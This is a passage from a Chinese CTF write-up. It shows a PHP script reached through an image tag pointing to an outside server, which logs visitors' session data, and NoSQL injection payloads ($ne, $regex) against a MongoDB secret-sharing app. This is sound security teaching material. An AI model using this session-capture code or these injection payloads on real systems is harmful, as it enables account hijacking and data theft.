184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">~/i/encrypted_filename.png</span></code><span style="font-size: 15px;">&nbsp;的请求用来校验身份。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">综上，我们可以利用上传的图片重定向到我们的服务器用来获取 session id 。</span></p>
<pre style="box-sizing: border-box;font-size: 16px;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;color: rgb(0, 0, 0);text-align: left;background-color: rgb(255, 255, 255);"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;"><span style="box-sizing: border-box;color: #000080;line-height: 26px;">&lt;img&nbsp;src=&quot;https://server.com/exp.php&quot;&gt;</span><br style="box-sizing: border-box;"/></code></pre>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">exp.php</span></p>
<pre style="box-sizing: border-box;font-size: 16px;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;color: rgb(0, 0, 0);text-align: left;background-color: rgb(255, 255, 255);"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;"><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">&lt;?php</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;$d&nbsp;=&nbsp;json_encode($_SERVER);<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;$filename&nbsp;=&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">__DIR__</span>&nbsp;.&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;/data.txt&quot;</span>;<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;file_put_contents($filename,&nbsp;$d);<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">?&gt;</span><br style="box-sizing: border-box;"/></code></pre>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">然后我们可以从本地 data.txt 得到 session id ，替换后再次访问可以从 flag.txt 得到 flag 。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">本地测试了下，data.txt 读取到&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">$_SERVER</span></code><span style="font-size: 15px;">的内容：</span></p>
<p style="text-align: center;"><img class="rich_pages js_insertlocalimg" style="" src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-148890-1607395270.png"/></p>
<h1 style="box-sizing: border-box;margin-top: 30px;margin-bottom: 15px;color: rgb(0, 0, 0);font-weight: bold;font-size: 24px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;font-size: 15px;">Secure Secret Sharing</span></h1>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">源码</span></p>
<pre style="box-sizing: border-box;font-size: 16px;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;color: rgb(0, 0, 0);text-align: left;background-color: rgb(255, 255, 255);"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;"><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">var</span>&nbsp;express&nbsp;=&nbsp;<span style="box-sizing: border-box;color: #0086B3;line-height: 26px;">require</span>(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;express&#39;</span>);<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">var</span>&nbsp;path&nbsp;=&nbsp;<span style="box-sizing: border-box;color: #0086B3;line-height: 26px;">require</span>(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;path&#39;</span>);<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">var</span>&nbsp;bodyParser&nbsp;=&nbsp;<span style="box-sizing: border-box;color: #0086B3;line-height: 26px;">require</span>(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;body-parser&#39;</span>)<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">var</span>&nbsp;fs&nbsp;=&nbsp;<span style="box-sizing: border-box;color: #0086B3;line-height: 26px;">require</span>(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;fs&#39;</span>);<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">const</span>&nbsp;{SHA256}&nbsp;=&nbsp;<span style="box-sizing: border-box;color: #0086B3;line-height: 26px;">require</span>(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;sha2&quot;</span>);<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">var</span>&nbsp;app&nbsp;=&nbsp;express();<br style="box-sizing: border-box;"/>app.use(bodyParser.urlencoded({<span style="box-sizing: border-box;line-height: 26px;">extended</span>:&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">false</span>}));<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">var</span>&nbsp;MongoClient&nbsp;=&nbsp;<span style="box-sizing: border-box;color: #0086B3;line-height: 26px;">require</span>(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;mongodb&#39;</span>).MongoClient;<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">const</span>&nbsp;mongo_url&nbsp;=&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;mongodb://localmongo&#39;</span>;<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">const</span>&nbsp;db_name&nbsp;=&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;secrets&#39;</span>;<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">const</span>&nbsp;db_client&nbsp;=&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">new</span>&nbsp;MongoClient(mongo_url);<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/>db_client.connect(<span style="box-sizing: border-box;line-height: 26px;">function(err)&nbsp;</span>{&nbsp;<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;db&nbsp;=&nbsp;db_client.db(db_name);<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;collection&nbsp;=&nbsp;db.collection(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;secrets&quot;</span>)<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;app.listen(<span style="box-sizing: border-box;color: #008080;line-height: 26px;">8080</span>);<br style="box-sizing: border-box;"/>});<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/>app.get(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;/&#39;</span>,&nbsp;<span style="box-sizing: border-box;line-height: 26px;">function(request,&nbsp;response)&nbsp;</span>{<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;response.sendFile(path.join(__dirname&nbsp;+&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;/html/index.html&#39;</span>));<br style="box-sizing: border-box;"/>});<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">//&nbsp;插入数据</span><br style="box-sizing: border-box;"/>app.post(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;/secret_share&#39;</span>,&nbsp;<span style="box-sizing: border-box;line-height: 26px;">function(request,&nbsp;response)&nbsp;</span>{<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">let</span>&nbsp;sec&nbsp;=&nbsp;request.body.sec;<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">//sha256&nbsp;散列，十六进制输出</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">let</span>&nbsp;secid&nbsp;=&nbsp;SHA256(sec).toString(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;hex&quot;</span>);<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">//无&nbsp;csr&nbsp;的情况插入</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>&nbsp;(sec.toLowerCase().includes(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;csr&quot;</span>))&nbsp;{<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response.redirect(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;/&#39;</span>);<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">else</span>&nbsp;{<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;collection.insertOne({<span style="box-sizing: border-box;line-height: 26px;">id</span>:&nbsp;secid,&nbsp;<span style="box-sizing: border-box;line-height: 26px;">secret</span>:&nbsp;sec});<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response.redirect(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;/secret_share?secid=&#39;</span>&nbsp;+&nbsp;secid);<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;}<br style="box-sizing: border-box;"/>});<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">//通过&nbsp;secid&nbsp;进行检索</span><br style="box-sizing: border-box;"/>app.get(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;/secret_share&#39;</span>,&nbsp;<span style="box-sizing: border-box;line-height: 26px;">function(request,&nbsp;response)&nbsp;</span>{<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">var</span>&nbsp;secid&nbsp;=&nbsp;request.query.secid;<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">var</span>&nbsp;sec&nbsp;=&nbsp;collection.findOne({<span style="box-sizing: border-box;line-height: 26px;">id</span>:&nbsp;secid});<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;sec.then(<span style="box-sizing: border-box;line-height: 26px;">sec&nbsp;=&gt;</span>&nbsp;{<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fs.readFile(__dirname&nbsp;+<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;/html/secret.html&#39;</span>,&nbsp;{<span style="box-sizing: border-box;line-height: 26px;">encoding</span>:&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;utf-8&#39;</span>},&nbsp;(err,&nbsp;data)&nbsp;=&gt;&nbsp;{<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">try</span>&nbsp;{<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response.send(data.replace(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;$secret&quot;</span>,&nbsp;sec[<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;secret&quot;</span>]));<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response.end();<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">catch</span>(e){<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;color: #0086B3;line-height: 26px;">console</span>.log(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;Error:&nbsp;&quot;</span>&nbsp;+&nbsp;e);<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response.status(<span style="box-sizing: border-box;color: #008080;line-height: 26px;">404</span>);<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response.send(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;id&nbsp;does&nbsp;not&nbsp;exist.&quot;</span>);<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response.end();<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;});&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;},&nbsp;error&nbsp;=&gt;&nbsp;{<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;color: #0086B3;line-height: 26px;">console</span>.log(error);<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;});<br style="box-sizing: border-box;"/>});<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/>app.get(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;/source&#39;</span>,&nbsp;<span style="box-sizing: border-box;line-height: 26px;">function(request,&nbsp;response)&nbsp;</span>{<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;fs.readFile(__filename,&nbsp;{<span style="box-sizing: border-box;line-height: 26px;">encoding</span>:&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;utf-8&#39;</span>},&nbsp;(err,&nbsp;data)&nbsp;=&gt;&nbsp;{<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response.type(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;text/plain&quot;</span>);<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response.send(data);<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response.end();<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;});<br style="box-sizing: border-box;"/>});<br style="box-sizing: border-box;"/></code></pre>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">ExpressJS MongoDB</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">因为国内文章关于 MongoDB 注入的比较少且发布时间早，所以我近期写了一篇文章在博客进行介绍，不了解的朋友可以先去看看：</span><span style="box-sizing: border-box;color: #1E6BB8;background-color: initial;outline: none;cursor: pointer;transition: color 0.3s ease 0s;touch-action: manipulation;overflow-wrap: break-word;font-weight: bold;border-bottom: 1px solid #1E6BB8;font-size: 15px;">mongodb 注入初识</span></p>
<pre style="box-sizing: border-box;font-size: 16px;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;color: rgb(0, 0, 0);text-align: left;background-color: rgb(255, 255, 255);"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;"><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">var</span>&nbsp;sec&nbsp;=&nbsp;collection.findOne({<span style="box-sizing: border-box;line-height: 26px;">id</span>:&nbsp;secid});<br style="box-sizing: border-box;"/></code></pre>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">由上，注入点可以确定为 secid 。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">用&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">$ne</span></code><span style="font-size: 15px;">&nbsp;进行测试一下：</span></p>
<pre style="box-sizing: border-box;font-size: 16px;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;color: rgb(0, 0, 0);text-align: left;background-color: rgb(255, 255, 255);"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;">//<span style="box-sizing: border-box;color: #0086B3;line-height: 26px;">test</span><br style="box-sizing: border-box;"/>?secid[<span style="box-sizing: border-box;color: #008080;line-height: 26px;">$ne</span>]=0<br style="box-sizing: border-box;"/>MySuperSecurePW123<br style="box-sizing: border-box;"/></code></pre>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">因为这里是&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">findOne()</span></code><span style="font-size: 15px;">&nbsp;只能返回第一条文档记录，而且最重要的一点，secid 是 sha256 加密过的，哈希值之间的差异非常大，我们不能凭 flag 的格式获取到前几位，所以我们改用&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">$regex</span></code><span style="font-size: 15px;">&nbsp;进行类似盲注的测试：</span></p>
<pre style="box-sizing: border-box;font-size: 16px;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;color: rgb(0, 0, 0);text-align: left;background-color: rgb(255, 255, 255);"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;">//<span style="box-sizing: border-box;color: #0086B3;line-height: 26px;">test</span><br style="box-sizing: border-box;"/>?secid[<span style="box-sizing: border-box;color: #008080;line-height: 26px;">$regex</span>]=^0<br style="box-sizing: border-box;"/>princess<br style="box-sizing: border-box;"/>//princess&nbsp;-&gt;&nbsp;04e77bf8f95cb3e1a36a59d1e93857c411930db646b46c218a0352e432023cf2<br style="box-sizing: border-box;"/></code></pre>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">这样是可行的，我们可以利用&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">$regex</span></code><span style="font-size: 15px;">&nbsp;位位遍历 0~f ，总能找到一个内容含 CSR 的 secret ，所以我手工测试了下，发现最好的情况是前四位就可以区分不同的哈希（开始有了&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">id does not exist.</span></code><span style="font-size: 15px;">&nbsp;的回显）。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">这里“盲注”不像 SQL 里面可以用二分法，要位位遍历，所以效率非常低。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">用四循环遍历当然太慢了，而且出现连续三位相同的概率几乎为 0 ，我们调换一下顺序，并且用&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">.</span></code><span style="font-size: 15px;">&nbsp;代替一位，这里因为只返回第一条文档，所以我们可以挨个试位置，所幸替换第一位就出了结果：</span></p>
